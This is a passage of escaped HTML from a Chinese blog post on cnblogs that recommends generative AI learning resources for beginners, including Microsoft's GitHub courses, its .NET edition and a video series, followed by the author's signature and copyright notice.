1);\">https://github.com/microsoft/generative-ai-for-beginners</span></a></span></strong></li>\n</ul>\n<p><img alt=\"image\" src=\"https://img2024.cnblogs.com/blog/1336199/202601/1336199-20260123212359545-472226933.png\" /></p>\n<p><img alt=\"image\" src=\"https://img2024.cnblogs.com/blog/1336199/202601/1336199-20260123212404769-1773736247.png\" /></p>\n<ul>\n<li><strong>面向初学者的生成式 AI 视频教程：</strong>&nbsp;<span style=\"color: rgba(0, 0, 255, 1);\"><strong><a href=\"https://learn.microsoft.com/zh-cn/shows/generative-ai-for-beginners/\" rel=\"noopener nofollow\" target=\"_blank\"><span style=\"color: rgba(0, 0, 255, 1);\">https://learn.microsoft.com/zh-cn/shows/generative-ai-for-beginners</span></a></strong></span></li>\n</ul>\n<p><img alt=\"image\" src=\"https://img2024.cnblogs.com/blog/1336199/202601/1336199-20260123212435040-1738581881.png\" /></p>\n<h2><span>生成式人工智能初学者（.NET版）</span></h2>\n<p><span>实用课程教你如何在.NET 中构建生成式人工智能应用。</span></p>\n<ul class=\"list-paddingleft-1\">\n<li><strong>生成式人工智能初学者（.NET版）：</strong>&nbsp;<span style=\"color: rgba(0, 0, 255, 1);\"><strong><a href=\"https://github.com/microsoft/Generative-AI-for-beginners-dotnet\" rel=\"noopener nofollow\" target=\"_blank\"><span style=\"color: rgba(0, 0, 255, 1);\">https://github.com/microsoft/Generative-AI-for-beginners-dotnet</span></a></strong></span></li>\n</ul>\n<p><img alt=\"image\" src=\"https://img2024.cnblogs.com/blog/1336199/202601/1336199-20260123212455556-965444622.png\" /></p>\n<p><img alt=\"image\" src=\"https://img2024.cnblogs.com/blog/1336199/202601/1336199-20260123212502745-1919709043.png\" /></p>\n<h2><span>AI实战从入门到精通</span></h2>\n<ul>\n<li><strong><span style=\"color: rgba(0, 0, 255, 1);\"><a href=\"https://github.com/YSGStudyHards/DotNetGuide\" rel=\"noopener nofollow\" target=\"_blank\"><span style=\"color: rgba(0, 0, 255, 1);\">https://github.com/YSGStudyHards/DotNetGuide</span></a></span></strong></li>\n</ul>\n<p><img alt=\"image\" src=\"https://img2024.cnblogs.com/blog/1336199/202601/1336199-20260123212532425-16529763.png\" /></p>\n</div>\n<div id=\"MySignature\">\n    <blockquote>\n<p style=\"font-family: YouYuan; font-size: 16px; margin: 0 auto 0.01em auto;\"><span style=\"font-size: 17px;\">作者名称：</span><a href=\"https://www.cnblogs.com/Can-daydayup/\" target=\"_blank\">追逐时光者</a></p>\n<p style=\"font-family: YouYuan; font-size: 16px; margin: 0 auto 0.01em auto;\"><span style=\"font-size: 17px;\">作者简介：</span>一个热爱编程、善于分享、喜欢学习、探索、尝试新事物和新技术的全栈软件工程师。</p>\n<p style=\"font-family: YouYuan; font-size: 16px; margin: 0 auto 0.01em auto;\">\n本文版权归作者和博客园共有，欢迎转载，但未经作者同意必须保留此段声明，且在文章页面明显位置给出原文链接，否则保留追究法律责任的权利。如果该篇文章对您有帮助的话，可以点一下右下角的<a href=\"\" style=\"color: red;\">【♥推荐♥】</a>，希望能够持续的为大家带来好的技术文章，文中可能存在描述不正确的地方，欢迎指正或补充，不胜感激。\n</p>\n</blockquote>\n</div>\n<div class=\"clear\"></div>\n\n            </div>\n            <div class=\"postDesc\">posted @ \n<span id=\"post-date\">2026-01-23 21:26</span>&nbsp;\n<a href=\"https://www.cnblogs.com/Can-daydayup\">追逐时光者</a>&nbsp;\n阅读(<span id=\"post_view_count\">50</span>)&nbsp;\n评论(<span id=\"post_comment_count\">0</span>)&nbsp;\n&nbsp;\n<a href=\"\">收藏</a>&nbsp;\n<a href=\"\">举报</a>\n</div>"
    }
  ]
}